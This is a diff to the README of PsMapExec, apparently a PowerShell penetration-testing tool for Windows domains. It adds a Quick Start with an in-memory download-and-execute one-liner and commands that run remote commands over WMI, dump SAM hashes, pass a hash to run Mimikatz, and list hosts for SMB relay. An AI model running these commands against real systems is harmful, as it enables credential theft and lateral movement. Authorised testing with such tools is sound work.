@@ -25,14 +25,46 @@ Planned methods
 * SNMP
 * FTP
 * SSH
-
-## Usage
+## Quick Start
+### Load the script directly into memory
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
+```
+\
+Execute some commands over WMI
+```
+PsMapExec -Targets Servers -Username Admin -Password Pass -Method WMI -Command "net user"
+```
+\
+Check RDP access across all systems
+```
+PsMapExec -Targets All -Username Admin -Password Pass -Method RDP
+```
+\
+Dump SAM over WinRM and Parse the results
+```
+PsMapExec -Targets Servers -Username Admin -Password Pass -Method WinRM -Module SAM -Option Parse
+```
+\
+Authenticate over WMI with a hash and execute mimikatz
+```
+PsMapExec -Targets Workstations -Username Admin -Hash [Hash] -Method WMI -Module Mimikatz -Option Parse
+```
+\
+Check SMB Signing on all domain systems
+```
+PsMapExec -Targets All -GenRelayList
+```
+## Detailed Usage
 * https://viperone.gitbook.io/pentest-everything/psmapexec/general-usage
 * https://viperone.gitbook.io/pentest-everything/psmapexec/methods
 * https://viperone.gitbook.io/pentest-everything/psmapexec/modules
 
+## Aknowledgements
+## Dependencies
 ## Support me
 <a href="https://www.buymeacoffee.com/ViperOne" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
+
 
 ## Example Images
 
